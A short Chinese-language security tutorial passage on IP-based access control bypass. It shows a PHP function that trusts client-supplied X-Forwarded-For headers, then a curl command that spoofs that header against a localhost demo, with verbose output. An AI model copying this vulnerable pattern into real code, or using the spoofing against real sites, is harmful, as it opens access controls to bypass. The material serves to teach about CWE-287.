#不正确的权限
例如某些网站根据IP进行限制,如:  

```
<?php
function getIP(){
  $arr = ['HTTP_X_FORWARDED_FOR','HTTP_CLIENT_IP','REMOTE_ADDR'];
  foreach ($arr as $key) {
    if(isset($_SERVER[$key])){
      $realip = $_SERVER[$key];
      break;
    }
  }
  return $realip;
}
$ip = getIP();
echo $ip;
```

此时可以通过伪造相关的信息来绕过:  

<pre>
$ ccurl localhost/demo.php -H "X-Forwarded-For:192.168.1.200" -v
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /demo.php HTTP/1.1
> Host: localhost
> User-Agent: curl/7.61.1
> Accept: */*
> X-Forwarded-For:192.168.1.200
>
< HTTP/1.1 200 OK
< Date: Tue, 14 May 2019 06:39:49 GMT
< Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
< X-Powered-By: PHP/5.4.45
< Content-Length: 13
< Content-Type: text/html
<
192.168.1.200* Connection #0 to host localhost left intact
</pre>

而直接请求的响应为:

<pre>
$ curl localhost/demo.php
::1
</pre>

详情可以[参见](http://cwe.mitre.org/data/definitions/287.html)